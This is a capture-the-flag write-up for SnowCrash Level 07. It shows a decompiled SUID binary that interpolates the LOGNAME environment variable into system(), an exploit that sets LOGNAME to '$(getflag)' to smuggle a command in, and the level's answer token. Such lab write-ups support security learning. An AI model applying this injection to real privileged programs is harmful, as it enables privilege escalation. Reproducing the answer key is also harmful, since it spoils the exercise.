# 🔐 Level 07

> **Category:** Environment Variable Injection  
> **Difficulty:** ⭐⭐☆☆☆  
> **Key Technique:** Command injection via environment variable

---

## 📋 Overview

A SUID binary reads an environment variable and passes it unsanitized to `system()`, allowing command injection.

---

## 🔍 Reconnaissance

### Initial Discovery

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

level07@SnowCrash:~$ ./level07 
level07
```

The binary prints `level07` — likely reading from an environment variable.

### Decompiled Source (via RetDec)

```c
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    int32_t v1 = getegid();
    int32_t v2 = geteuid();
    
    setresgid(v1, v1, v1);
    setresuid(v2, v2, v2);
    
    char *buffer = NULL;
    char *env_val = getenv("LOGNAME");
    
    asprintf(&buffer, "/bin/echo %s ", env_val);
    return system(buffer);
}
```

---

## 💡 Vulnerability Analysis

The binary constructs a command using `asprintf()`:

```c
asprintf(&buffer, "/bin/echo %s ", env_val);
return system(buffer);
```

> [!CAUTION]
> The `LOGNAME` environment variable is directly interpolated into a shell command without any sanitization. This allows arbitrary command execution.

---

## 🎯 Exploitation

### Injecting Commands via Environment Variable

```bash
# Set LOGNAME to execute getflag
level07@SnowCrash:~$ export LOGNAME='$(getflag)'

# Execute the SUID binary
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `fiumuikeil55xe9cu4dood66h` |

---

## 📚 References

- [Environment Variable Injection](https://owasp.org/www-community/attacks/Injection_Theory)
- [asprintf - man page](https://linux.die.net/man/3/asprintf)